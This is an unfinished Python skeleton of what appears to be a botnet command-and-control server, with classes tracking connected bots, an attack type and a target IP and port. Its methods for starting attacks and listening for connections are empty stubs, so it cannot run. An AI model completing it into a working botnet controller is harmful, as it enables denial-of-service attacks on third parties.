import threading

class netbot:
    def __init__(self, id, is_start, ip_address):
        self.id = id
        self.is_start = is_start
        self.ip_address = ip_address


class Server:
    def __init__(self):
        self.socketfd = -1

        self.attacking = False
        self.attack = "None"

        self.target_ip = "None"
        self.target_port = 0

        self.netbots = []
        self.threads = []
        self.tListener = threading.Thread()

    def get_server_fd(self):
        return self.socketfd
    
    def set_server_fd(self, socketfd):
        self.socketfd = socketfd

    def set_attack(self, attack):
        self.attack = attack
    
    def is_attacking(self):
        return self.attacking

    def server_status(self):
        if self.target_ip == "None" and self.attack == "None" and self.attacking == False:
            return "\nServer started, waiting for client connections...\n"
        elif self.attack == "HALT" and self.target_ip != "None":
            return "\nAttack halted. Waiting for commands.\n"
        elif self.attacking == True and self.attack == "None":
            self.attacking = False
            return "\nPlease, enter attack type.\n"
        elif self.attacking == True and self.target_ip == "None":
            self.attacking = False
            return "\nPlease, enter target parameters.\n"
        elif self.attacking == True:
            return "\nServer attacking (" + self.attack + ") target: " + self.target_ip + "\n"  
        else:
            return "\nServer started, waiting for client connections...\n"
            
    def setup_target_parameters():
        
    def start_attack():
        
    def close_connected_sockets():
    
    def list_bots():
        
    def setup_attack_type():
        
    def threaded():
    
    def connection_listener():    
    
